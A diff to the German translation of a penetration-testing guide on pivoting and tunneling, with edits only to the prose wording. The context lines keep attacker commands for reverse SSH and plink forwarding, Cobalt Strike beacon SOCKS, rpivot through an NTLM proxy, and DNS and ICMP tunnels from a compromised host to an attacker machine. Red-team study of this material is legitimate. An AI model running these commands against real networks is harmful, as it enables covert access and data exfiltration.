@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Öffnen Sie einen neuen Port im SSH-Server --> Anderer Port
+Öffnen Sie neuen Port auf SSH-Server --> Anderer Port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokaler Port --> Kompromittierter Host (SSH) --> Third_box:Port
+Lokaler Port --> Kompromittierter Host (SSH) --> Dritte_Box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS-Proxy
 
-Öffnen Sie einen Port im Teamserver, der an allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
+Öffnen Sie einen Port im Teamserver, der auf allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -156,7 +156,7 @@ rportfwd stop [bind port]
 ```
 Zu beachten:
 
-- Beacons Reverse-Port-Forward ist dafür ausgelegt, **Verkehr zum Team-Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
+- Beacons Reverse-Port-Forwarding ist dafür ausgelegt, **Verkehr zum Team-Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
 - Der Verkehr wird **innerhalb des C2-Verkehrs von Beacon getunnelt**, einschließlich P2P-Links.
 - **Admin-Rechte sind nicht erforderlich**, um Reverse-Port-Forwards auf hohen Ports zu erstellen.
 
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Durch **NTLM-Proxy** pivotieren
+Pivotieren durch **NTLM-Proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es ist wie eine Konsolen-PuTTY-Version (die Optionen sind sehr ähnlich zu einem ssh-Client).
 
-Da dieses Binary auf dem Opfer ausgeführt wird und es ein ssh-Client ist, müssen wir unseren ssh-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung haben können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
+Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -364,7 +364,7 @@ Jetzt können wir über **RDP** mit dem **Opfer** über **`mstsc.exe`** **verbin
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Bestätigen Sie nun auf Ihrem Gerät (Angreifer), dass der Port 1080 lauscht:
+Bestätigen Sie jetzt auf Ihrem Gerät (Angreifer), dass der Port 1080 lauscht:
 ```
 netstat -antb | findstr 1080
 ```
@@ -388,7 +388,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Es authentifiziert sich gegen einen Proxy und bindet einen lokalen Port, der an den externen Dienst weitergeleitet wird, den Sie angeben. Dann können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
-Zum Beispiel den weitergeleiteten Port 443
+Zum Beispiel, um Port 443 weiterzuleiten.
 ```
 Username Alice
 Password P@ssw0rd
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Jetzt, wenn Sie beispielsweise den **SSH**-Dienst auf dem Opfer auf Port 443 einstellen, können Sie sich über den Angreifer-Port 2222 damit verbinden.\
+Jetzt, wenn Sie beispielsweise den **SSH**-Dienst beim Opfer auf Port 443 einstellen, können Sie sich über den Angreifer-Port 2222 damit verbinden.\
 Sie könnten auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer hört auf Port 2222.
 
 ## YARP
@@ -409,13 +409,13 @@ Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden es hier: [https:
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root wird in beiden Systemen benötigt, um tun-Adapter zu erstellen und Daten zwischen ihnen über DNS-Abfragen zu tunneln.
+Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen über DNS-Abfragen zu tunneln.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie Folgendes verwenden:
+Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -459,7 +459,7 @@ Proxychains intercepts `gethostbyname` libc call und tunnelt TCP-DNS-Anfragen du
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root wird in beiden Systemen benötigt, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
+Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -570,7 +570,7 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-Starten Sie den Connector:
+Starte den Connector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
@@ -599,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Verwendung des neuen SSH-Gateways (kein frpc-Binär)
+### Verwendung des neuen SSH-Gateways (kein frpc-Binärdatei)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
